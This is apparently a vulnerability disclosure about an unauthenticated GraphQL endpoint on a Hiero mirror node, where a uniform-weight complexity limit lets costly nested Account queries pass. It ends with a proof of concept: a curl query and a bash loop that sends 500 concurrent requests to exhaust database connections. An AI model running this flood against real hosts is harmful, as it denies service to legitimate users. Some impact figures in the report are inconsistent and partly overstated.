### Title
GraphQL Account Query Complexity Miscalibration Allows Unauthenticated Resource Exhaustion via Uniform-Weight Complexity Calculator

### Summary
The `MaxQueryComplexityInstrumentation` in `GraphQlConfiguration.java` is configured with a limit of 200 but uses the default uniform complexity calculator that assigns weight 1 to every field regardless of backend cost. A single valid, unauthenticated query requesting all fields on `Account` — including nested object fields (`stakedAccount`, `autoRenewAccount`, `obtainer`) that each trigger additional database lookups — scores approximately 85 complexity points, well under the limit, while maximizing per-request backend load. Repeated flooding of such queries by any unprivileged external user can exhaust database connections and degrade mirror node throughput.

### Finding Description

**Exact code location:**

`graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, lines 42–48:

```java
var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);
``` [1](#0-0) 

No custom `FieldComplexityCalculator` is provided to `MaxQueryComplexityInstrumentation`, so graphql-java falls back to its default: **every field, scalar or object, costs exactly 1 complexity point**.

**Schema surface:**

The `Account` type exposes ~21 fields. Three of them — `stakedAccount: Account`, `autoRenewAccount: Account`, and `obtainer: Accountable` — are nested object types that each require an additional database lookup to resolve. The `balance` and `pendingReward` fields involve joins to `entity_stake`. All are freely selectable in a single query. [2](#0-1) 

**Complexity arithmetic:**

A query requesting all fields of `Account` plus all sub-fields of `stakedAccount`, `autoRenewAccount`, and `obtainer` (each also an `Account`/`Accountable` with ~21 fields) scores:

- Root `account` field: 1
- 21 top-level `Account` fields: 21
- 21 fields inside `stakedAccount`: 21
- 21 fields inside `autoRenewAccount`: 21
- 21 fields inside `obtainer`: 21
- **Total: ~85** — well under the limit of 200. [3](#0-2) 

**Root cause:** The failed assumption is that field count is a proxy for backend cost. It is not. Scalar fields (`memo`, `alias`, `deleted`) are resolved from an already-fetched entity row at zero additional DB cost, while nested object fields (`stakedAccount`, `autoRenewAccount`, `obtainer`) each require a separate entity lookup. The complexity calculator treats them identically.

**Why existing checks fail:**

- `MaxQueryComplexityInstrumentation(200)` — limit is never reached by a maximally expensive valid query (~85 points).
- `MaxQueryDepthInstrumentation(10)` — limits recursive nesting but does not constrain the width of a single-level query.
- Parser limits (`maxCharacters(10000)`, `maxTokens(1000)`) — prevent syntactically malformed or oversized queries but not semantically expensive valid ones.
- `inFlightReq: amount: 5` (Traefik middleware in `charts/hedera-mirror-graphql/values.yaml`) — limits 5 concurrent requests per source IP, but is infrastructure-level, bypassable with multiple source IPs, and does not bound per-request DB load. [4](#0-3) 

### Impact Explanation

Each maximally expensive query can trigger 4–5 database queries (one for the root account, one each for `stakedAccount`, `autoRenewAccount`, `obtainer`, plus `entity_stake` joins for `balance`/`pendingReward`). With the HikariCP connection pool shared across all requests, sustained flooding saturates available DB connections, causing legitimate queries to queue or time out. The `statementTimeout` of 10 seconds means each saturating request holds a connection for up to 10 seconds. This directly degrades the mirror node's ability to serve gossip-related data and process incoming transactions. [5](#0-4) 

### Likelihood Explanation

No authentication, API key, or account registration is required to reach `/graphql/alpha`. The exploit requires only an HTTP client and knowledge of the public GraphQL schema (discoverable via introspection, which is enabled by default in Spring for GraphQL). The query is valid, passes all instrumentation checks, and can be issued at high frequency from a single machine or distributed across multiple IPs to bypass the Traefik `inFlightReq` limit. The attack is trivially repeatable and scriptable.

### Recommendation

1. **Provide a custom `FieldComplexityCalculator`** to `MaxQueryComplexityInstrumentation` that assigns higher weights to nested object fields (`stakedAccount`, `autoRenewAccount`, `obtainer`) — e.g., weight 10–50 per nested `Account`/`Accountable` field — so that a maximally expensive query exceeds the complexity limit.
2. **Lower the complexity ceiling** once weights are calibrated to reflect actual DB cost.
3. **Add application-level rate limiting** (e.g., via Spring's `HandlerInterceptor` or a token-bucket filter) keyed on IP or client identity, independent of the infrastructure layer.
4. **Disable or restrict GraphQL introspection** in production to prevent schema enumeration.
5. Consider **persisted queries** (allowlist of known-safe query hashes) to eliminate ad-hoc query abuse entirely.

### Proof of Concept

```bash
# No authentication required. Send to the public endpoint.
curl -s -X POST http://<mirror-node-host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "{ account(input: { entityId: { shard: 0, realm: 0, num: 2 } }) {
      alias balance key memo pendingReward nonce
      stakedAccount {
        alias balance key memo pendingReward nonce
        autoRenewAccount { alias balance key memo pendingReward nonce }
        obtainer { alias balance key memo pendingReward nonce }
      }
      autoRenewAccount {
        alias balance key memo pendingReward nonce
        stakedAccount { alias balance key memo pendingReward nonce }
        obtainer { alias balance key memo pendingReward nonce }
      }
      obtainer {
        alias balance key memo pendingReward nonce
        stakedAccount { alias balance key memo pendingReward nonce }
        autoRenewAccount { alias balance key memo pendingReward nonce }
      }
      timestamp { from to }
    }}"
  }'

# Flood with concurrent requests to exhaust DB connections:
for i in $(seq 1 500); do
  curl -s -X POST http://<mirror-node-host>/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ account(input:{entityId:{shard:0,realm:0,num:2}}){ balance pendingReward key stakedAccount{balance pendingReward key autoRenewAccount{balance pendingReward}} autoRenewAccount{balance pendingReward key stakedAccount{balance}} obtainer{balance pendingReward key} timestamp{from to} }}"}' &
done
wait
```

Each iteration of the loop issues a query that scores ~85 complexity points (under the 200 limit), passes all parser and depth checks, and triggers 5–8 database queries. With 500 concurrent requests across multiple IPs, the HikariCP pool is exhausted and legitimate mirror node operations are denied service.

### Citations

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L42-48)
```java
    GraphQlSourceBuilderCustomizer graphQlCustomizer(PreparsedDocumentProvider provider) {
        var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
        var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
        var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);

        return b -> b.configureGraphQl(
                graphQL -> graphQL.instrumentation(instrumentation).preparsedDocumentProvider(provider));
```

**File:** graphql/src/main/resources/graphql/account.graphqls (L1-81)
```text
"""
Represents an account holder on the network.
"""
type Account implements Accountable & Entity & Node {
    "The unique alias associated with this account."
    alias: String

    "The account charged the auto-renewal fee."
    autoRenewAccount: Account

    "The amount of time to elapse before auto-renew occurs."
    autoRenewPeriod: Duration

    "The balance of the accountable entity. Defaults to tinybars."
    balance(unit: HbarUnit = TINYBAR): Long

    "The consensus timestamp at which the entity was created."
    createdTimestamp: Timestamp

    "Whether the entity declines receiving a staking reward."
    declineReward: Boolean!

    "Whether the entity still exists in consensus node state."
    deleted: Boolean

    "The unique identifier associated with the entity."
    entityId: EntityId!

    """
    The time at which this entity will expire and be auto-renewed, if possible. If this was not explicitly set by the
    user it will be calculated as the createdTimestamp plus the autoRenewPeriod.
    """
    expirationTimestamp: Timestamp

    "An opaque, globally unique identifier specific to GraphQL."
    id: ID!

    """
    The admin key associated with this entity whose signing requirements must be met in order to modify the entity on
    the network. This returns a dynamic map that varies per entity and may be arbitrarily complex depending upon this
    key's signing requirements.
    """
    key: Object

    "The maximum number of tokens that this account can be implicitly associated with."
    maxAutomaticTokenAssociations: Int

    "The memo associated with the entity."
    memo: String!

    "The ethereum transaction nonce associated with this account."
    nonce: Long

    "The accountable entity to receive the remaining balance from the deleted entity."
    obtainer: Accountable

    """
    The pending reward the account will receive in the next reward payout. Note the value is updated at the end of each
    staking period and there may be delay to reflect the changes in the past staking period. Defaults to tinybars.
    """
    pendingReward(unit: HbarUnit = TINYBAR): Long

    "Whether the admin key must sign any transaction depositing into this account (in addition to all withdrawals)."
    receiverSigRequired: Boolean

    "The account to which this account is staked. Mutually exclusive with stakedNode."
    stakedAccount: Account

    """
    The staking period during which either the staking settings for this account changed (such as starting staking or
    changing stakedNode) or the most recent reward was earned, whichever is later. If this account is not currently
    staked to a node, then the value is null.
    """
    stakePeriodStart: Timestamp

    "A consensus timestamp range with an inclusive from timestamp and an exclusive to timestamp."
    timestamp: TimestampRange!

    "The type of entity."
    type: EntityType!
}
```

**File:** charts/hedera-mirror-graphql/values.yaml (L138-140)
```yaml
  - inFlightReq:
      amount: 5
      sourceCriterion:
```

**File:** docs/graphql/README.md (L23-23)
```markdown
| `hiero.mirror.graphql.db.statementTimeout` | 10000                                            | The maximum amount of time in seconds to wait for a query to finish                                                                                                                           |
```
